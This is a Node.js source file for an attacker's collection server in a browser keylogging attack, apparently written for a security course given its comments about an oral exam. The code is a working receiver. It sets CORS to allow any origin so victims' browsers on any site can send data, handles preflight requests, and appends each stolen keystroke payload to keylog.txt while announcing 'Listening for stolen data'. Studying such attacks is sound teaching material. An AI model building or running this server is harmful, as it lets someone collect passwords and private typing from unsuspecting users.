const http = require('http');
const fs = require('fs');

const PORT = 4000;
const LOG_FILE = 'keylog.txt';

const server = http.createServer((req, res) => {
  // 1. The CORS Bypass (Crucial for the oral exam)
  // Browsers block cross-origin POST requests by default. 
  // By setting this to '*', we explicitly tell the victim's browser: 
  // "It is completely fine to send data here, no matter what site you are on."
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // 2. Handle Preflight (OPTIONS) Requests
  // When a browser sends a cross-origin POST, it often sends an invisible 
  // 'OPTIONS' request first to verify the CORS headers. We must answer 200 OK.
    if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
    }

  // 3. Intercept and log the incoming data
    if (req.method === 'POST') {
        let body = '';
    
    // Receive the data in chunks
        req.on('data', chunk => {
        body += chunk.toString();
        });

    // When the full payload is received, save it
        req.on('end', () => {
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] Key: ${body}\n`;

        fs.appendFile(LOG_FILE, logEntry, (err) => {
            if (err) {
                console.error('Failed to write to log:', err);
                res.writeHead(500);
                res.end('File system error');
            } else {
                console.log(`Exfiltrated: ${body}`);
                res.writeHead(200);
                res.end('Data received');
                }
            });
        });
    } else {
        // Ignore any non-POST traffic
        res.writeHead(404);
        res.end();
    }
});

server.listen(PORT, () => {
    console.log(`[Attacker Server] Listening for stolen data on http://localhost:${PORT}`);
});